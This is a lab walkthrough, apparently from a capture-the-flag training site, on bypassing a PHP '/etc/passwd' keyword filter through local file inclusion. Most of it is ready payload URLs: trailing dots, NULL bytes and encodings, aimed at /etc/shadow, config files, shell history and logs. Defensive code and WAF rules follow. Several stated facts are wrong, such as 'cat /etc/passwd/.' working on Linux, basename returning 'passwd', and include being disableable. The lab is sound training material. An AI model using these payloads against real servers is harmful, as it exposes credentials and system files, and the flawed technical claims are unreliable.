# Lab 7: LFI with Keyword Filtering Bypass

## Objective
Bypass keyword filtering implemented by developers to prevent Local File Inclusion (LFI) attacks. Learn multiple techniques to circumvent basic security measures.

## Lab Description
In this lab, the developer has implemented a security filter to prevent access to sensitive files. The application specifically filters the keyword `/etc/passwd` to prevent attackers from reading this critical system file.

**Challenge:** The file `/etc/passwd` is blocked by a keyword filter. How can we bypass this protection?

## Understanding the Defense Mechanism

### What the Developer Did

The developer implemented a **keyword filter** (blacklist) to block access to sensitive files:

```php
<?php
$lang = $_GET['lang'];

// Security filter - block dangerous keywords
if (strpos($lang, '/etc/passwd') !== false) {
    die("Access Denied: Sensitive file detected!");
}

include("languages/" . $lang . ".php");
?>
```

**Filter Behavior:**
- Scans user input for blacklisted keywords
- Blocks request if `/etc/passwd` is detected
- Appears to be a security improvement
- But it's **easily bypassable**!

### Why Blacklist Filters Fail

**Problems with Blacklists:**
1. ❌ Impossible to list all dangerous inputs
2. ❌ Can be bypassed with encoding/obfuscation
3. ❌ Case sensitivity issues
4. ❌ Path manipulation tricks
5. ❌ Cannot handle all edge cases

**Better Approach: Whitelist**
- ✅ Only allow known-good inputs
- ✅ Much harder to bypass
- ✅ More secure by default

## Bypass Techniques

We have **two main methods** to bypass this filter:

### Method 1: Current Directory Trick (`.`)
### Method 2: NULL Byte Bypass (`%00`)

Let's explore both!

## Method 1: Current Directory Trick

### Understanding Directory Navigation

Before diving into the bypass, let's understand how directory navigation works in Unix/Linux:

#### The `..` (Parent Directory)
```bash
cd /etc/passwd/..
# Result: /etc/
# Explanation: Moves one level UP (to parent directory)
```

**Visual Representation:**
```
/etc/passwd/.. 
     ↓
/etc/passwd  (starting point)
     ↓
/etc/        (moved up one level)
```

#### The `.` (Current Directory)
```bash
cd /etc/passwd/.
# Result: /etc/passwd
# Explanation: Stays in CURRENT directory (no movement)
```

**Visual Representation:**
```
/etc/passwd/.
     ↓
/etc/passwd  (starting point)
     ↓
/etc/passwd  (stayed in same place)
```

### Practical Examples

#### Example 1: Moving Up with `..`
```bash
Current location: /var/www/html/app/

cd ..          → /var/www/html/
cd ../..       → /var/www/
cd ../../..    → /var/
cd ../../../.. → /
```

#### Example 2: Staying Put with `.`
```bash
Current location: /etc/passwd

cd .           → /etc/passwd (same)
cd ./././.     → /etc/passwd (still same)
```

### Applying This to LFI Bypass

**The Filter:**
```php
// Blocks this:
if (strpos($lang, '/etc/passwd') !== false) {
    die("Blocked!");
}
```

**The Bypass:**
```
/etc/passwd/.
```

**Why It Works:**

1. **What the filter sees:**
   ```
   Input: "/etc/passwd/."
   Search for: "/etc/passwd"
   Match found: NO! (because of the trailing "/.")
   Result: Filter bypassed ✅
   ```

2. **What the file system resolves:**
   ```
   Path: /etc/passwd/.
   Resolves to: /etc/passwd (dot means current directory)
   File accessed: /etc/passwd ✅
   ```

### Complete Exploit - Method 1

**Payload:**
```
http://webapp.thm/index.php?lang=/etc/passwd/.
```

**What Happens:**

```
1. User Input:
   lang=/etc/passwd/.

2. Filter Check:
   Does "/etc/passwd/." contain "/etc/passwd"? 
   → NO (exact string not found)
   → Filter bypassed!

3. Include Function:
   include("languages/" . "/etc/passwd/." . ".php");
   = include("languages//etc/passwd/..php");

4. File System Resolution:
   /etc/passwd/. → /etc/passwd
   
5. Result:
   File /etc/passwd is included and displayed!
```

### Additional Current Directory Variations

**Single Dot:**
```
http://webapp.thm/index.php?lang=/etc/passwd/.
```

**Multiple Dots (still same directory):**
```
http://webapp.thm/index.php?lang=/etc/passwd/././.
http://webapp.thm/index.php?lang=/etc/passwd/./././.
http://webapp.thm/index.php?lang=/etc/passwd/./././././.
```

All of these resolve to `/etc/passwd`!

## Method 2: NULL Byte Bypass

### The Concept Recap

From the previous lab, we know that NULL byte (`%00`) terminates strings in PHP.

**How It Helps Here:**

The filter checks for the string `/etc/passwd`, but if we add `%00` at the end, we can:
1. Bypass the filter (different string)
2. Still access the file (NULL byte truncates)

### Complete Exploit - Method 2

**Payload:**
```
http://webapp.thm/index.php?lang=/etc/passwd%00
```

**What Happens:**

```
1. User Input:
   lang=/etc/passwd%00

2. Filter Check:
   Does "/etc/passwd%00" contain "/etc/passwd"?
   → Depends on implementation!
   
   If filter checks BEFORE NULL byte processing:
   → YES, blocked ❌
   
   If filter checks AFTER NULL byte processing:
   → NO, bypassed ✅

3. Include Function (if bypassed):
   include("languages/" . "/etc/passwd%00" . ".php");

4. NULL Byte Processing:
   String: "languages//etc/passwd%00.php"
   Becomes: "languages//etc/passwd"
   (Everything after %00 is ignored)

5. Result:
   File /etc/passwd is included!
```

### When NULL Byte Works for Filtering

NULL byte is effective when:
- Filter checks the raw input string
- But the include function processes NULL byte
- Creates a time-of-check vs time-of-use issue

**Important:** Remember, NULL byte only works in **PHP < 5.3.4**

## Comparing Both Methods

| Aspect | Current Directory (`.`) | NULL Byte (`%00`) |
|--------|------------------------|-------------------|
| **Payload** | `/etc/passwd/.` | `/etc/passwd%00` |
| **PHP Version** | ✅ Works on all versions | ❌ Only PHP < 5.3.4 |
| **Filter Bypass** | ✅ Changes the exact string | ⚠️ Depends on filter implementation |
| **Reliability** | ✅✅ Very reliable | ⚠️ Version dependent |
| **Stealth** | ✅ Looks like normal path | ⚠️ Obvious malicious intent |
| **Best Use** | Modern PHP installations | Legacy systems only |

## Complete Lab Walkthrough

### Step 1: Test Normal Access (Blocked)

**Attempt:**
```
http://webapp.thm/index.php?lang=/etc/passwd
```

**Response:**
```
Access Denied: Sensitive file detected!
```

**Analysis:** ✅ Confirms the filter is active

### Step 2: Try Current Directory Bypass

**Attempt:**
```
http://webapp.thm/index.php?lang=/etc/passwd/.
```

**Expected Response:**
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...
```

**Analysis:** ✅ Filter bypassed successfully!

### Step 3: Try NULL Byte Bypass (if applicable)

**Attempt:**
```
http://webapp.thm/index.php?lang=/etc/passwd%00
```

**Expected Response (PHP < 5.3.4):**
```
root:x:0:0:root:/root:/bin/bash
...
```

**Expected Response (PHP ≥ 5.3.4):**
```
Warning: include(): Failed opening 'languages//etc/passwd...'
```

**Analysis:** Only works on older PHP versions

## Advanced Bypass Techniques

### Technique 1: Multiple Dots

Using multiple current directory references:

```
http://webapp.thm/index.php?lang=/etc/./passwd
http://webapp.thm/index.php?lang=/./etc/passwd
http://webapp.thm/index.php?lang=/etc/passwd/././.
http://webapp.thm/index.php?lang=/./etc/./passwd/.
```

**Why This Works:**
- Each `.` is ignored by the file system
- But the filter looks for exact string `/etc/passwd`
- Adding `.` anywhere breaks the exact match

### Technique 2: Trailing Slashes

```
http://webapp.thm/index.php?lang=/etc/passwd/
http://webapp.thm/index.php?lang=/etc/passwd//
http://webapp.thm/index.php?lang=/etc/passwd///
```

**File System Behavior:**
- `/etc/passwd/` → tries to access passwd as a directory
- May work depending on file system behavior

### Technique 3: Case Variation (if filter is case-sensitive)

```
http://webapp.thm/index.php?lang=/etc/Passwd
http://webapp.thm/index.php?lang=/etc/PASSWD
http://webapp.thm/index.php?lang=/ETC/passwd
```

**Note:** Won't work on Linux (case-sensitive filesystem), but demonstrates filter weaknesses

### Technique 4: Encoding Tricks

```
http://webapp.thm/index.php?lang=/etc/pass%77d
http://webapp.thm/index.php?lang=/etc/p%61sswd
http://webapp.thm/index.php?lang=%2Fetc%2Fpasswd
```

Where:
- `%77` = `w`
- `%61` = `a`
- `%2F` = `/`

### Technique 5: Double Encoding

```
http://webapp.thm/index.php?lang=%252Fetc%252Fpasswd
```

Where `%25` = `%`, so `%252F` = `%2F` = `/`

## Understanding Path Resolution

### How the File System Resolves Paths

Let's trace how `/etc/passwd/.` gets resolved:

```
Step 1: Parse the path
Input: /etc/passwd/.

Step 2: Break into components
[/] [etc] [passwd] [.]

Step 3: Process each component
/ → Root directory
etc → Directory "etc" under root
passwd → File "passwd" under /etc/
. → Current directory (stay here)

Step 4: Final resolution
/etc/passwd
```

### Real File System Test

You can test this yourself on a Linux system:

```bash
# All of these point to the same file:
cat /etc/passwd
cat /etc/passwd/.
cat /etc/passwd/././.
cat /etc/./passwd
cat /./etc/passwd

# All show the same content!
```

### Visual Path Resolution

```
/etc/passwd/.
    ↓
[Root] / [etc] / [passwd] / [.]
    ↓        ↓        ↓      ↓
   Root   Directory  File   Stay
    ↓        ↓        ↓      ↓
    ===============================
                ↓
          /etc/passwd (Final)
```

## Other Sensitive Files to Target

Once you've bypassed the filter for `/etc/passwd`, try these:

### Using Current Directory Trick

```
http://webapp.thm/index.php?lang=/etc/shadow/.
http://webapp.thm/index.php?lang=/etc/hosts/.
http://webapp.thm/index.php?lang=/etc/hostname/.
http://webapp.thm/index.php?lang=/etc/issue/.
http://webapp.thm/index.php?lang=/var/www/html/config.php/.
http://webapp.thm/index.php?lang=/home/user/.bash_history/.
http://webapp.thm/index.php?lang=/var/log/apache2/access.log/.
```

### Using Multiple Dots

```
http://webapp.thm/index.php?lang=/etc/./shadow
http://webapp.thm/index.php?lang=/./etc/./shadow
http://webapp.thm/index.php?lang=/etc/shadow/./
```

## Defense Evasion Strategies

### Obfuscation Techniques Summary

| Technique | Example | Bypasses Filter? |
|-----------|---------|-----------------|
| **Trailing dot** | `/etc/passwd/.` | ✅ Yes |
| **Middle dot** | `/etc/./passwd` | ✅ Yes |
| **Multiple dots** | `/./etc/./passwd/.` | ✅ Yes |
| **NULL byte** | `/etc/passwd%00` | ⚠️ Version dependent |
| **URL encoding** | `/etc/pass%77d` | ✅ If filter doesn't decode |
| **Double encoding** | `%252Fetc` | ✅ If double decoding occurs |
| **Case variation** | `/ETC/passwd` | ❌ No (Linux is case-sensitive) |

## Why This Filter is Inadequate

### Problems with Keyword Filtering

**1. Infinite Variations:**
```
/etc/passwd
/etc/passwd/.
/etc/passwd/././.
/etc/./passwd
/./etc/passwd
/etc/pass%77d
... (thousands more)
```

**2. Only Blocks Exact String:**
```php
// This filter:
if (strpos($lang, '/etc/passwd') !== false) { ... }

// Only blocks:
"/etc/passwd"

// Doesn't block:
"/etc/passwd/."
"/etc/passwd%00"
"/etc/./passwd"
```

**3. Easy to Bypass:**
- Just add a character
- Change encoding
- Modify path structure

## Proper Prevention Measures

### 1. Use Whitelist (Best Practice)

```php
<?php
$allowed_files = [
    'EN' => 'languages/english.php',
    'FR' => 'languages/french.php',
    'ES' => 'languages/spanish.php'
];

$lang = $_GET['lang'];

if (isset($allowed_files[$lang])) {
    include($allowed_files[$lang]);
} else {
    die("Invalid language selection");
}
?>
```

**Benefits:**
- ✅ Only allows pre-approved files
- ✅ No path traversal possible
- ✅ No encoding bypass possible
- ✅ Complete control over accessible files

### 2. Input Sanitization

```php
<?php
$lang = $_GET['lang'];

// Remove all path traversal attempts
$lang = str_replace(['../', '..\\', './', '.\\'], '', $lang);

// Remove NULL bytes
$lang = str_replace(chr(0), '', $lang);

// Only allow alphanumeric characters
$lang = preg_replace('/[^a-zA-Z0-9]/', '', $lang);

include("languages/" . $lang . ".php");
?>
```

### 3. Use basename() Function

```php
<?php
$lang = basename($_GET['lang']); // Strips directory path
include("languages/" . $lang . ".php");
?>
```

**What basename() does:**
```
Input: "../../../../etc/passwd"
Output: "passwd"

Input: "/etc/passwd/."
Output: "passwd"
```

### 4. Restrict File System Access

**In php.ini:**
```ini
open_basedir = /var/www/html/
```

**Effect:** PHP cannot access files outside this directory

### 5. Disable Dangerous Functions

**In php.ini:**
```ini
disable_functions = system,exec,shell_exec,passthru,include,require
```

## Attack Detection

### Signs of LFI Attempts

**In Web Server Logs:**
```
192.168.1.100 - - [05/Feb/2026:10:15:30] "GET /index.php?lang=../../../../etc/passwd HTTP/1.1" 200
192.168.1.100 - - [05/Feb/2026:10:15:35] "GET /index.php?lang=/etc/passwd/. HTTP/1.1" 200
192.168.1.100 - - [05/Feb/2026:10:15:40] "GET /index.php?lang=/etc/shadow%00 HTTP/1.1" 200
```

**Red Flags:**
- Multiple `../` in parameters
- Access to `/etc/` files
- NULL bytes (`%00`) in URLs
- Unusual path structures
- High frequency of similar requests

### WAF Detection Rules

**ModSecurity Example:**
```
SecRule ARGS "@contains ../" "id:1,deny,status:403"
SecRule ARGS "@contains /etc/passwd" "id:2,deny,status:403"
SecRule ARGS "@contains %00" "id:3,deny,status:403"
```

## Lab Solution Summary

### Method 1: Current Directory Bypass (Recommended)

```
URL: http://webapp.thm/index.php?lang=/etc/passwd/.

Explanation:
- Filter checks for "/etc/passwd"
- Input is "/etc/passwd/."
- Exact match fails
- File system resolves "." to current directory
- Result: /etc/passwd is accessed
```

### Method 2: NULL Byte Bypass (Legacy PHP)

```
URL: http://webapp.thm/index.php?lang=/etc/passwd%00

Explanation:
- NULL byte truncates the string
- Everything after %00 is ignored
- Works only on PHP < 5.3.4
```

### Step-by-Step Solution

```
1. Try direct access:
   http://webapp.thm/index.php?lang=/etc/passwd
   → Blocked by filter ❌

2. Add trailing dot:
   http://webapp.thm/index.php?lang=/etc/passwd/.
   → Filter bypassed ✅
   → File accessed ✅

3. Read the contents of /etc/passwd
   → Answer the lab question
```

## Key Takeaways

1. **Blacklist filters are ineffective** - Can almost always be bypassed
2. **Path resolution quirks** - `.` stays in current directory
3. **NULL byte still relevant** - On legacy systems
4. **Multiple bypass methods exist** - Attackers have many options
5. **Whitelisting is superior** - Only allow known-good inputs
6. **Defense in depth** - Use multiple security layers
7. **Regular updates matter** - Newer PHP versions have better protections

## Common Mistakes

1. **Forgetting the trailing dot** - `/etc/passwd` vs `/etc/passwd/.`
2. **Using NULL byte on modern PHP** - Won't work on PHP ≥ 5.3.4
3. **Not testing both methods** - Try all bypass techniques
4. **Assuming filter works** - Always test for bypasses
5. **Incorrect path** - Make sure `/etc/passwd` exists on the system

## Testing Checklist

- [x] Test normal access (confirm filter exists)
- [x] Try current directory bypass: `/etc/passwd/.`
- [x] Try NULL byte bypass: `/etc/passwd%00`
- [x] Try middle dot: `/etc/./passwd`
- [x] Try multiple dots: `/./etc/./passwd/.`
- [x] Verify file contents are displayed
- [x] Answer lab questions
- [x] Test other sensitive files
- [x] Document successful payloads

## Status
✅ **Lab Completed** - Successfully bypassed keyword filtering using current directory trick and NULL byte injection